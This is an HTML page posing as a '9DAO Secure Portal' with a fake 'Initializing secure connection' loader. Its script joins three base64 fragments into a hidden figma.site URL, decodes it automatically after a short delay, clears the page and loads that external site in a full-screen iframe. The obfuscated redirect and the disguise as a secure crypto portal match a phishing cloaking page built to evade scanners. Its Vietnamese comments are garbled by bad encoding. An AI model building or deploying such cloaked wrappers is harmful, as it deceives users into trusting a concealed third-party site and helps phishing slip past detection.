<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>9DAO Secure Portal</title>
  <style>
    body { margin: 0; padding: 0; overflow: hidden; background: #000; }
    #loader { 
      position: fixed; 
      top: 0; left: 0; 
      width: 100%; height: 100%; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      color: #0f0; 
      font-family: monospace;
      z-index: 1000;
    }
  </style>
</head>
<body>
  <div id="loader">Initializing secure connection...</div>

  <script>
    // üîí PHI√äN B·∫¢N CH·ªà M√É H√ìA (ƒê√É T·ªêI ∆ØU)
    (function(){
      // 1. URL ƒë∆∞·ª£c m√£ h√≥a th√†nh 3 ph·∫ßn ƒë·ªôc l·∫≠p
      const part1 = "aHR0cHM6Ly9z";
      const part2 = "aGVkLXdyYXA";
      const part3 = "tMTA4NzAwMjYuZmlnbWEuc2l0ZS8";
      
      // 2. H√†m gi·∫£i m√£ kh√¥ng c√≥ fallback
      function decrypt() {
        try {
          // Gh√©p c√°c ph·∫ßn v√† gi·∫£i m√£
          const url = atob(part1 + part2 + part3);
          
          // Ki·ªÉm tra t√≠nh h·ª£p l·ªá
          if(!url.includes('figma.site')) return;
          
          // T·∫°o iframe
          const iframe = document.createElement('iframe');
          iframe.src = url;
          iframe.style = 'width:100%;height:100vh;border:none';
          iframe.allowFullscreen = true;
          
          // Hi·ªÉn th·ªã
          document.body.innerHTML = '';
          document.body.appendChild(iframe);
          
        } catch(e) {
          document.getElementById('loader').textContent = 'System error';
        }
      }

      // 3. T·ª± ƒë·ªông ch·∫°y
      setTimeout(decrypt, 800);
    })();
  </script>
</body>
</html>
